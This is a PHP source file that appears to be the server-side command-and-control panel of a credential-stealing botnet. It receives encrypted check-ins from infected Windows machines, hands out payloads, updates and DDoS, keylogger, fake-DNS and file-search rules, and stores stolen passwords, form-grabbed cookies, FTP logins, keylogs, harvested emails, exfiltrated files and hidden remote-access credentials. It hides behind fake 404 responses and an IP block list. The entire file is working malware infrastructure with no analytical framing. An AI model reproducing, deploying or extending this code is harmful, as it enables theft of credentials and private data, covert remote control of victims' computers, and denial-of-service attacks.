<?php

$block_ip = array(
'8.30.234.',
'37.19.198.',
'67.217.160.',
'72.12.194.',
'80.219.36.',
'83.78.247.',
'84.17.52.',
'88.217.152.',
'89.167.131.',
'98.167.185.',
'102.129.143.',
'102.129.152.',
'102.129.153.',
'102.165.48.',
'138.199.10.',
'138.199.13.',
'143.215.130.',
'154.3.40.',
'154.3.42.',
'154.16.192.',
'154.29.131.',
'154.61.71.',
'156.146.36.',
'156.146.48.',
'156.146.62.',
'173.245.209.',
'176.10.99.',
'178.198.76.',
'178.199.49.',
'181.214.61.',
'185.220.101.',
'185.220.102.',
'185.220.103.',
'185.248.101.',
'186.77.196.',
'188.126.94.',
'191.96.150.',
'191.96.185.',
'191.96.227.',
'192.42.123.',
'192.87.28.',
'194.191.248.',
'195.181.175.',
'206.71.168.',
'212.102.36.',
'212.102.37.',
'216.131.75.',
'216.131.89.',
'216.131.111.',
'216.151.184.',
'69.55.5.'//или группа адресов
);
 
foreach($block_ip as $ip) {
    if(strstr($_SERVER["HTTP_X_FORWARDED_FOR"], $ip)) {
        die('Your IP blocked');
    }
}




error_reporting(0);
@set_time_limit(0);
@ini_set("max_execution_time",0);

require_once "./inc/cfg.php";
require_once "./inc/geoip.inc";
require_once "./inc/funcs.php";

if ($_SERVER["REQUEST_METHOD"] === "POST"){
	$size = intval($_SERVER["CONTENT_LENGTH"]);
	if ($size < 4) die(include "404.php");
	$input = file_get_contents("php://input");
	$data = RC4($input,pack("i",decryptkey),$size,4);
	
	$bot = unpack("SBOT_MAGIC/a41BOT_ID/a16BOT_COMPNAME/a6BOT_AFFID/CBOT_WINVER/cBOT_WINBIT/cBOT_PRIVIL/SBOT_CMD/iBOT_OPT/iBOT_RES/Z*BOT_DATA",$data);
	if (intval($bot["BOT_MAGIC"]) != MAGIC) die(include "404.php");
	
	global $dbcon;
	mysql_init();
	
	$login = preg_replace("/(\W|\_)/","",$bot["BOT_ID"]);
	$sel = preg_replace("/(\W|\_)/","",$bot["BOT_AFFID"]);
	$compname = $bot["BOT_COMPNAME"];
	
	if (strlen($login) !== 40) die(include "404.php");
	$os = get_os(intval($bot["BOT_WINVER"]));
	$bits = intval($bot["BOT_WINBIT"]);
	$privs = intval($bot["BOT_PRIVIL"]);
	$ip = get_ip(false);
	$proxyip = get_ip(true);
	//ignore RU
	$country = get_country($proxyip);
	if (stristr($country,"RU") !== false) die(include "404.php");
	//check for ban
	$req = mysqli_query($dbcon,"SELECT * FROM `bots` WHERE `cname`='{$login}'");
	if (mysqli_num_rows($req)){
		$res = mysqli_fetch_assoc($req);
		if ($res["ban"] == 1) die(include "404.php");
	}
	//
	switch (intval($bot["BOT_CMD"])){
		case CMD_ONLINE:
			if (intval($bot["BOT_OPT"]) === 0){
				$hash = "";
			} else if (intval($bot["BOT_OPT"]) === 1){
				$hash = substr($bot["BOT_DATA"],0,32);
				$hash = preg_replace("/(\W|\_)/","",$hash);
			} else die(include "404.php");
			$files = 0;
			$time = time();
			$answer = "";
			$hget = false;
			$installed = intval($bot["BOT_RES"]);
			$req = mysqli_query($dbcon,"SELECT * FROM `bots` WHERE `cname`='{$login}'");
			if (mysqli_num_rows($req)){
				$res = mysqli_fetch_assoc($req);
				if ($res["upd"] == 1){
					mysqli_query($dbcon,"UPDATE `bots` SET `time`=".$time." WHERE `cname`='{$login}'");
					MakeOutput("u",0);
				}
				if ($res["personal"] == 1){
					mysqli_query($dbcon,"UPDATE `bots` SET `time`=".$time." WHERE `cname`='{$login}'");
					MakeOutput("i",0);
				}
				if ($res["delete"] == 1){
					mysqli_query($dbcon,"UPDATE `bots` SET `time`=".$time." WHERE `cname`='{$login}'");
					MakeOutput("r",0);
				}
				if ($res["fsearch"] != 1) $fsearchs = true; else $fsearchs = false;
				if ($res["hget"] != 0) $hget = true; else $hget = false;
				$last = $res["ltaskid"];
				$req = mysqli_query($dbcon,"SELECT COUNT(*) FROM `tasks` WHERE `id`>{$last}");
				$row = mysqli_fetch_array($req,MYSQLI_NUM);
				$files = intval($row[0]);
				mysqli_query($dbcon,"UPDATE `bots` SET `ip`='{$ip}',`proxyip`='{$proxyip}',`time`=".$time.",`seller`='{$sel}',`privs`={$privs} WHERE `cname`='{$login}'");
			} else{
				mysqli_query($dbcon,"INSERT INTO `bots` (`ip`,`proxyip`,`comp`,`os`,`country`,`time`,`cname`,`seller`,`bits`,`installed`,`privs`) VALUES ('{$ip}','{$proxyip}','{$compname}',{$os},'{$country}',{$time},'{$login}','{$sel}',{$bits},{$installed},{$privs}) ON DUPLICATE KEY UPDATE `time`={$time}");
				$req = mysqli_query($dbcon,"SELECT COUNT(*) FROM `tasks`");
				$row = mysqli_fetch_array($req,MYSQLI_NUM);
				$files = intval($row[0]);
				$fsearchs = true;
			}
			$req = mysqli_query($dbcon,"SELECT * FROM `plugins`");
			if (mysqli_num_rows($req)){
				$res = mysqli_fetch_assoc($req);
				if (!empty($res["fakedns_rules"])) $answer .= "|:|fakedns_rules={$res["fakedns_rules"]}|:|";
				if ($fsearchs && !empty($res["filesearch_rules"])) $answer .= "|:|filesearch_rules={$res["filesearch_rules"]}|:|";
				if ($hget) $answer .= "|:|runhtv|:|";
				if (!empty($res["procmon_rules"])) $answer .= "|:|procmon_rules={$res["procmon_rules"]}|:|";
				if (!empty($res["ddos_rules"])) $answer .= "|:|ddos_rules={$res["ddos_rules"]}|:|";
				if (!empty($res["keylog_rules"])) $answer .= "|:|keylog_rules={$res["keylog_rules"]}|:|";
				if ($res["fgcookies"] == 1) $answer .= "|:|fgclearcookies|:|";
				if (strcasecmp($res["hash"],$hash) == 0){
					MakeOutput($files.$answer,0);
				} else{
					$pluginsize = intval(@filesize("./mods/plugins"));
					$answer .= "|:|plugin_size={$pluginsize}";
					MakeOutput($files.$answer,1);
				}
			} else die(include "404.php");
			break;
		case CMD_GETTASK:
			switch (intval($bot["BOT_OPT"])){
				case 0x69:
					$req = mysqli_query($dbcon,"SELECT * FROM `bots` WHERE `cname`='{$login}'");
					if (mysqli_num_rows($req)){
						$res = mysqli_fetch_assoc($req);
						if ($res["personal"] == 1){
							$id = $res["id"];
							$req = mysqli_query($dbcon,"SELECT * FROM `personal` WHERE `botid`={$id}");
							if (mysqli_num_rows($req)){
								$res = mysqli_fetch_assoc($req);
								if ($res["task"] === "local"){
									mysqli_query($dbcon,"UPDATE `bots` SET `personal`=0 WHERE `cname`='{$login}'");
									MakeOutputFile($res["isdll"],0,"p{$id}.tmp",0);
								} else {
									mysqli_query($dbcon,"UPDATE `bots` SET `personal`=0 WHERE `cname`='{$login}'");
									MakeOutputFile($res["isdll"],0,$res["task"],1);
								}
							}
						}
					} else die(include "404.php");
					break;
				case 0x72:
					mysqli_query($dbcon,"DELETE FROM `bots` WHERE cname='{$login}'");
					die(include "404.php");
					break;
				case 0x75:
					$req = mysqli_query($dbcon,"SELECT * FROM `bots` WHERE `cname`='{$login}'");
					$res = mysqli_fetch_assoc($req);
					if ($res["upd"] == 1){
						$req = mysqli_query($dbcon,"SELECT * FROM `options`");
						$res = mysqli_fetch_assoc($req);
						if (strlen($res["upd"]) > 10) MakeOutputFile(0,0,$res["upd"],1); elseif ($res["upd"] === "local") MakeOutputFile(0,0,"update.exe",0);
					} else die(include "404.php");
					break;
				default:
					$req = mysqli_query($dbcon,"SELECT * FROM `bots` WHERE `cname`='{$login}'");
					$last = 0;
					if (mysqli_num_rows($req)){
						$res = mysqli_fetch_assoc($req);
						$last = $res["ltaskid"];
					}
					$req = mysqli_query($dbcon,"SELECT * FROM `tasks` WHERE `id`>{$last} ORDER BY `id` ASC LIMIT 1");
					if (!mysqli_num_rows($req)) die(include "404.php");
					$load = mysqli_fetch_assoc($req);
					mysqli_query($dbcon,"UPDATE `bots` SET `ltaskid`={$load["id"]} WHERE `cname`='{$login}'");
					if ($load["limit"] > 0)	if ($load["loads"] >= $load["limit"]) die(include "404.php");
					if ($load["bits"] == 1 && $bits != 0) die(include "404.php");
					if ($load["bits"] == 2 && $bits != 1) die(include "404.php");
					$country = strtolower($country);
					$country_n = "!".$country;
					$loadc = explode(",", $load["country"]);
					if ($loadc[0] !== "all"){
						if (!in_array($country,$loadc)) die(include "404.php");
					} elseif ($loadc[0] === "all"){
						if (in_array($country_n,$loadc)) die(include "404.php");
					}
					if ($load["stop"] == 0 && $load["seller"] === $sel){
						if (strlen($load["from"]) > 10)	MakeOutputFile($load["isdll"],$load["delafter"],$load["from"],1); else MakeOutputFile($load["isdll"],$load["delafter"],$load["id"].".tmp",0);
					}
					if ($load["stop"] == 0 && $load["seller"] === "0"){
						if (strlen($load["from"]) > 10)	MakeOutputFile($load["isdll"],$load["delafter"],$load["from"],1); else MakeOutputFile($load["isdll"],$load["delafter"],$load["id"].".tmp",0);
					}
			}
			break;
		case CMD_TASKRESULT:
			switch (intval($bot["BOT_OPT"])){
				case 0x75:
					switch (intval($bot["BOT_RES"])){
						case 1:	mysqli_query($dbcon,"UPDATE `bots` SET `upd`=0,`time`=".time()." WHERE `cname`='{$login}'"); break;
					}
					break;
				default:
					$req = mysqli_query($dbcon,"SELECT * FROM `bots` WHERE `cname`='{$login}'");
					$last = 0;
					if (mysqli_num_rows($req)){
						$i = mysqli_fetch_assoc($req);
						$last = $i["ltaskid"];
					}
					switch (intval($bot["BOT_RES"])){
						case 0:	mysqli_query($dbcon,"UPDATE `tasks` SET `loads`=`loads`+1 WHERE `id`={$last}");	break;
						case 1:	mysqli_query($dbcon,"UPDATE `tasks` SET `loads`=`loads`+1,`runs`=`runs`+1 WHERE id={$last}"); break;
					}
			}
			die(include "404.php");
			break;
		case CMD_STEALERRESULT:
			$res = $bot["BOT_DATA"];
			if (strlen($res) > 10){
				$data = base64_decode($res);
				$size = strlen($data);
				if ($size > 20){
					$offset = 0;
					while ($offset < $size){
						$module = unpack("iMOD_LEN/iMOD_ID",$data);
						if (!$module) break;
						$module_size = intval($module["MOD_LEN"]);
						$module_id = intval($module["MOD_ID"]);
						if ($module_size > $size || $module_id > 255) break;
						$module_data_size = $module_size - 8;
						$module_data = substr($data,8,$module_data_size);
						if (!$module_data) break;
						$entry_offset = 0; $param_counter = 0;
						$host = ""; $user = ""; $pass = "";
						while ($entry_offset < $module_data_size){
							$entry = unpack("iENTRY_LEN",$module_data);
							//if (!$entry) break;
							$entry_size = intval($entry["ENTRY_LEN"]);
							if ($entry_size > $module_data_size) break;
							$entry_value = substr($module_data,4,$entry_size);
							//if (!$entry_value) break;
							switch ($param_counter){
								case 0: $host = $entry_value; break;
								case 1: $user = $entry_value; break;
								case 2: $pass = $entry_value; break;
							}
							$param_counter++;
							if ($param_counter == 3){
								//if (strlen($host) > 4 && strlen($user) > 1 && strlen($pass) > 1){
								if (strlen($host) > 4){
									$host = mysqli_real_escape_string($dbcon,$host);
									$user = mysqli_real_escape_string($dbcon,$user);
									$pass = mysqli_real_escape_string($dbcon,$pass);
									mysqli_query($dbcon,"INSERT INTO `stealer` (`cname`,`softid`,`host`,`user`,`pass`,`time`) VALUES ('{$login}',{$module_id},'{$host}','{$user}','{$pass}',".time().")");
								}
								$param_counter = 0;
							}
							$entry_offset += $entry_size + 4;
							$module_data = substr($module_data,$entry_size + 4,$module_data_size - $entry_offset);
							if (!$module_data) break;
						}
						$offset += $module_size;
						$data = substr($data,$module_size,$size - $offset);
						if (!$data) break;
					}
				}
			}
			die(include "404.php");
			break;
		case CMD_PROCMON:
			$procname = mysqli_real_escape_string($dbcon,$bot["BOT_DATA"]);
			if (!empty($procname)){
				$req = mysqli_query($dbcon,"SELECT * FROM `procmon` WHERE `process`='{$procname}'");
				$res = mysqli_fetch_assoc($req);
				if (strlen($res["url"]) > 10) MakeOutputFilePlain($res["url"],1); elseif ($res["url"] === "0") MakeOutputFilePlain("pm_".$res["id"].".tmp",0);
			} else die(include "404.php");
			break;
		case CMD_PROCMONRESULT:
			$procname = mysqli_real_escape_string($dbcon,$bot["BOT_DATA"]);
			if (!empty($procname)){
				switch (intval($bot["BOT_OPT"])){
					case 1:	mysqli_query($dbcon,"UPDATE `procmon` SET `success`=`success`+1 WHERE `process`='{$procname}'"); break;
				}
			}
			die(include "404.php");
			break;
		case CMD_FGRESULT:
			$res = $bot["BOT_DATA"];
			if (strlen($res) > 10){
				$data = mysqli_real_escape_string($dbcon,base64_decode($res));
				$tmp = explode("{:!:}",$data);
				$r = mysqli_query($dbcon,"SELECT `fgfilter` FROM `plugins`");
				$v = mysqli_fetch_assoc($r);
				$filter = $v["fgfilter"];
				if (!empty($tmp[4]) && strlen($tmp[4])>6){
					$skip = false;
					if (strlen($filter)){
						$arr1 = explode(",",$filter);
						foreach ($arr1 as $value1){
							if (stripos($tmp[1],$value1) !== false){
								$skip = true;
								break;
							}
						}
					}
					if (!$skip) mysqli_query($dbcon,"INSERT IGNORE INTO `formgrab` (`cname`,`browser`,`url`,`uagent`,`cookies`,`data`,`time`) VALUES ('{$login}','{$tmp[0]}','{$tmp[1]}','{$tmp[2]}','{$tmp[3]}','{$tmp[4]}',".time().")");
				}
			}
			die(include "404.php");
			break;
		case CMD_PASSSNIFRESULT:
			$res = $bot["BOT_DATA"];
			if (strlen($res) > 10){
				$data = mysqli_real_escape_string($dbcon,base64_decode($res));
				mysqli_query($dbcon,"INSERT IGNORE INTO `ftpgrab` (`data`) VALUES ('{$data}')");
			}
			die(include "404.php");
			break;
		case CMD_FSRESULT:
			$res = $bot["BOT_DATA"];
			if (strlen($res) > 255){
				mysqli_query($dbcon,"UPDATE `bots` SET `fsearch`=1 WHERE `cname`='{$login}'");
				$data = base64_decode($res);
				$date = date("d.m.Y-H.i.s");
				$path = "./files/{$login}";
				mkdir($path);
				savefile("{$path}/".date("d.m.Y-H.i.s").".zip",$data);
			}
			die(include "404.php");
			break;
		case CMD_DDOSRESULT:
			switch (intval($bot["BOT_OPT"])){
				case 0:	mysqli_query($dbcon,"UPDATE `bots` SET `ddos`=0 WHERE `cname`='{$login}'");	break;
				case 1:	mysqli_query($dbcon,"UPDATE `bots` SET `ddos`=1 WHERE `cname`='{$login}'");	break;
			}
			die(include "404.php");
			break;
		case CMD_KEYLOGRESULT:
			$res = $bot["BOT_DATA"];
			if (strlen($res) > 10){
				$date = date("d.m.Y");
				$path = "./keylogger/".$login;
				mkdir($path);
				$path = $path."/".$date.".txt";
				$data = base64_decode($res);
				savefileu($path,$data);
			}
			die(include "404.php");
			break;
		case CMD_HIDDENTV:
			readfile("./mods/tv");
			form404();
			break;
		case CMD_HIDDENTVRESULT:
			$res = $bot["BOT_DATA"];
			$data = base64_decode($res);
			$tmp = explode("{:!:}",$data);
			$hid = mysqli_real_escape_string($dbcon,$tmp[0]);
			$hidpass = mysqli_real_escape_string($dbcon,$tmp[1]);
			if (!empty($hid) && !empty($hidpass)) mysqli_query($dbcon,"UPDATE `bots` SET `hget`=0,`hid`='{$hid}',`htime`=".time().",`hpass`='{$hidpass}' WHERE `cname`='{$login}'");
			die(include "404.php");
			break;
		case CMD_EGRABBERRESULT:
			$res = $bot["BOT_DATA"];
			if (strlen($res) > 10){
				$data = mysqli_real_escape_string($dbcon,base64_decode($res));
				$tmp = explode(",",$data);
				foreach ($tmp as $s){
					if ($s && strlen($s) > 6) mysqli_query($dbcon,"INSERT IGNORE INTO `emailgrab` (`data`) VALUES ('{$s}')");
				}
			}
			die(include "404.php");
			break;
		default: die(include "404.php");
	}
} else die(include "404.php");

?>